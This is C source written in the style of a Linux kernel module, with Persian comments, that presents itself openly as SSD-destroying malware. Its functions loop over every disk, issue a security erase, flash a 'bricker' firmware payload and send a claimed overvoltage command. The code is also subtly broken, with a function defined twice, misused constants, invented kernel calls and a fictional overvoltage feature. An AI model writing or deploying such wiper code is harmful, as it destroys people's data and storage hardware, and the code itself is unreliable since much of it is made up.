#include <linux/ata.h>
#include <linux/libata.h>
#include <scsi/scsi_cmnd.h>
#include <scsi/scsi_device.h>
#include "ata_cmds.h"

// تخریب کنترلر SSD با دستورات ATA مخرب
void destroy_ssd(struct scsi_device *sdev) {
    u8 cmd[ATA_16];
    unsigned long flags;
    
    // فرمت ترک‌های سیستم با پارامترهای مخرب
    memset(cmd, 0, ATA_16);
    cmd[0] = ATA_CMD_TRUSTED_NON_DATA;
    cmd[1] = 0x04; // Security Erase
    cmd[2] = 0x01; // Enhanced
    cmd[3] = 0x0F; // Quick Erase
    cmd[4] = 0xDE; cmd[5] = 0xAD; // Magic
    cmd[6] = 0xBE; cmd[7] = 0xEF; // Magic
    
    // ارسال دستور
    ata_scsi_queuecmd(NULL, sdev, cmd);
    
    // فلش فرم‌ور SSD با پیلود مخرب
    memset(cmd, 0, ATA_16);
    cmd[0] = ATA_CMD_DOWNLOAD_MICROCODE;
    cmd[1] = 0x0E; // Activate immediate
    cmd[2] = 0x01; // Subcommand: write to flash
    cmd[3] = (SSD_BRICKER_SIZE >> 8) & 0xFF;
    cmd[4] = SSD_BRICKER_SIZE & 0xFF;
    
    const u8 *payload = get_ssd_bricker_payload();
    ata_scsi_transfer(NULL, sdev, DMA_TO_DEVICE, payload, SSD_BRICKER_SIZE);
    ata_scsi_queuecmd(NULL, sdev, cmd);
    
    // ارسال ولتاژ بیش از حد به سلول‌های NAND
    memset(cmd, 0, ATA_16);
    cmd[0] = ATA_CMD_SET_FEATURES;
    cmd[1] = 0xEF; // Vendor specific
    cmd[2] = 0x01; // Overvoltage command
    cmd[3] = 0xFF; // Maximum voltage
    ata_scsi_queuecmd(NULL, sdev, cmd);
}

// ارسال دستور ATA مخرب
static void send_destructive_ata_cmd(struct scsi_device *sdev, u8 feature, u8 command) {
    u8 cdb[ATA_16] = {
        0x85,                           // ATA_16
        0x0E,                           // PROTECT=0, DLDIR=1 (to device)
        feature,                         // Feature
        0x00, 0x00,                     // Sector Count
        0x00, 0x00, 0x00, 0x00,         // LBA
        command,                         // Command
        0x00,                            // Device
        0x00,                            // Reserved
        0x00,                            // Control
    };
    
    struct scsi_cmnd *cmnd = scsi_alloc_command(sdev->request_queue, GFP_KERNEL);
    if (!cmnd) return;
    
    memcpy(cmnd->cmnd, cdb, ATA_16);
    cmnd->cmd_len = ATA_16;
    cmnd->sc_data_direction = DMA_TO_DEVICE;
    
    scsi_execute_cmd(cmnd, NULL, 0, 30 * HZ, 3, NULL);
    scsi_free_command(cmnd);
}

// فلش فرم‌ور SSD مخرب
static void flash_corrupted_firmware(struct scsi_device *sdev) {
    const u8 *payload = get_ssd_bricker_payload();
    size_t size = SSD_BRICKER_SIZE;
    
    // ارسال دستور دانلود میکروکد
    u8 download_cdb[ATA_16] = {
        0x85, 0x0E, 0x00, 0x00, 0x02, 
        (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF,
        ATA_CMD_DOWNLOAD_MICROCODE,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    struct scsi_cmnd *cmnd = scsi_alloc_command(sdev->request_queue, GFP_KERNEL);
    if (!cmnd) return;
    
    memcpy(cmnd->cmnd, download_cdb, ATA_16);
    cmnd->cmd_len = ATA_16;
    cmnd->sc_data_direction = DMA_TO_DEVICE;
    cmnd->buffer = (void *)payload;
    cmnd->bufflen = size;
    
    scsi_execute_cmd(cmnd, NULL, 0, 30 * HZ, 3, NULL);
    scsi_free_command(cmnd);
    
    // فعال‌سازی میکروکد مخرب
    u8 activate_cdb[ATA_16] = {
        0x85, 0x0E, 0x01, 0x00, 0x00, 
        0x00, 0x00, 0x00,
        ATA_CMD_DOWNLOAD_MICROCODE,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    send_scsi_command(sdev, activate_cdb, sizeof(activate_cdb));
}

// تخریب اصلی SSD
void destroy_ssd(void) {
    struct scsi_device *sdev;
    spin_lock(&scsi_device_list_lock);
    list_for_each_entry(sdev, &scsi_device_list, siblings) {
        if (sdev->type == TYPE_DISK) {
            // مرحله 1: پاک‌سازی امن پیشرفته
            send_destructive_ata_cmd(sdev, 0x04, ATA_CMD_SECURITY_ERASE);
            msleep(30000);
            
            // مرحله 2: فلش فرم‌ور مخرب
            flash_corrupted_firmware(sdev);
            
            // مرحله 3: ارسال ولتاژ بیش از حد
            send_destructive_ata_cmd(sdev, 0xEF, ATA_CMD_SET_FEATURES);
        }
    }
    spin_unlock(&scsi_device_list_lock);
}
